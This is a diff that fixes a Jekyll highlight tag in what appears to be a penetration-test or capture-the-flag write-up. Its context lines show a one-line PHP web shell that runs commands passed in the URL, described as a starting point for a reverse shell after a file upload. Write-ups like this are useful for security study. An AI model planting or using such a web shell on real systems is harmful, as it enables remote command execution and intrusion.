@@ -623,7 +623,7 @@ Poke around a bit to try and upload a file, then looking through plugins I see t
 
 {% highlight php %}
 <?php system($_GET["cmd"]); ?>
-{% endlight %}
+{% endhighlight %}
 
 This will serve as a starting point to getting a real reverse shell going:
 
